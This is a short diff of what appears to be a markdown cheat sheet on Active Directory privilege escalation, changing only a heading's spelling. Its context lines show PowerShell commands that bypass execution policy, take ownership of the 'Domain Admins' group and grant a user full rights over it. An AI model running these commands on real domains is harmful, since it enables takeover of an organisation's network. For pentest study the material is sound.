@@ -110,7 +110,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 ```bash
 Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose
 ```
-- 2.Grant yourself GenericAll
+- 2.Grant yourself Generic All
 ```bash
 Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose
 ```
